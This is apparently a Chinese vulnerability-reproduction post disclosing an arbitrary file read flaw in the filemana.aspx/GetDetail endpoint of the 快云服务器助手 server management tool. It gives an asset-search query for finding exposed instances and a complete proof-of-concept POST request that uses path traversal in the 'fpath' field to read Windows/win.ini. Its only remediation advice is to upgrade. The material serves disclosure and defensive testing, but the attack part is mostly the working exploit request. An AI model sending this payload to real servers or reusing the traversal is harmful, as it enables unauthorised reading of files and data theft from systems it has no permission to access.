#  快云服务器助手 filemana.aspx/GetDetail 接口存在任意文件读取漏洞  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-24 16:15  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
01  
  
—  
  
漏洞名称  
  
快云服务器助手  
 filemana.aspx/GetDetail   
接口存在任意文件读取漏洞  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqG3NFLnVgxcbTcnwWcNoBfDenwHH1nSCdibic9tnNlWQLl7vZZmKMfBCQ/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
  
快云服务器助手是一款针对云计算环境下的服务器管理与监控工具，旨在帮助企业用户更加便捷、高效地管理其云服务器。通过跨平台的一键式管理与监控功能，该工具能够支持多种云服务商，如阿里云、腾讯云、华为云等，实现统一管理和监控，极大地提高了运维效率。支持  
Windows  
、  
Linux  
、  
Mac  
等多种操作系统，用户可以在不同的平台上使用同一款软件进行服务器管理与监控。功能强大、易于使用的服务器管理与监控工具。它能够帮助企业用户高效地管理其云服务器，提高运维效率，确保业务的稳定运行  
。  
  
  
04  
  
—  
  
资产测绘  
  
```
app="快云服务器助手"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqYicFRbw9aibFLzNGPdiaOoeY13rgTibLUAPRq20m3w0VvHBgH2WoP58QGw/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
POST /FileMenu/filemana.aspx/GetDetail
HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62
Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 99
 
{"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqoPF5cVdx9JdryjUVFicnuibwhSypic3gYQcCJpQ6dOGl1aRrJxXyjF9Rg/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
**升级到安全版本**  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
